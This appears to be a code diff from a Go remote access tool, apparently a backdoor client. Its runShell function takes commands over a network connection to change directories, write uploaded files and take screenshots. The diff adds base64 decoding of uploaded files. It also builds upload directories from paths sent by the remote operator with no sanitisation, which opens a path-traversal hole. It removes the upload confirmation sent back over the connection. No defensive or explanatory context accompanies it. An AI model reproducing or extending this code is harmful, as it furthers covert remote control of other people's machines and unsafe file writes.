@@ -115,9 +115,11 @@ func runShell(conn net.Conn) {
 			os.Chdir(string(dir))
 
 		case "upload":
-			dir := "upload"
-			if _, err := os.Stat(dir); os.IsNotExist(err) {
-				if err2 := os.MkdirAll(dir, 0755); err2 != nil {
+			filePath := strings.Split(commands[len(commands)-1], "/")
+			lastPathFromRecievedFile := strings.Join(filePath[:len(filePath)-1], "/")
+			dir := "upload/"
+			if _, err := os.Stat(dir + lastPathFromRecievedFile); os.IsNotExist(err) {
+				if err2 := os.MkdirAll(dir+lastPathFromRecievedFile, 0755); err2 != nil {
 					log.Fatalf("Could not create the path %s", dir)
 				}
 			}
@@ -154,12 +156,13 @@ func runShell(conn net.Conn) {
 
 			//fmt.Println(string(content))
 			//save
-			file, err := os.Create(dir + "/" + fileName)
+			file, err := os.Create(dir + fileName)
 			if err != nil {
-				conn.Write([]byte(err.Error()))
+				log.Println(err)
 				break
 			}
-			_, err = file.Write(content)
+			base64ToData, err := base64.StdEncoding.DecodeString(string(content))
+			_, err = file.Write(base64ToData)
 			if err != nil {
 				file.Close()
 				log.Println(err)
@@ -171,7 +174,6 @@ func runShell(conn net.Conn) {
 				break
 			}
 			fmt.Println("content save")
-			conn.Write([]byte("Upload Success"))
 
 		case "screenshot": //ex: screenshot
 			//スクリーンショットを撮影し送信
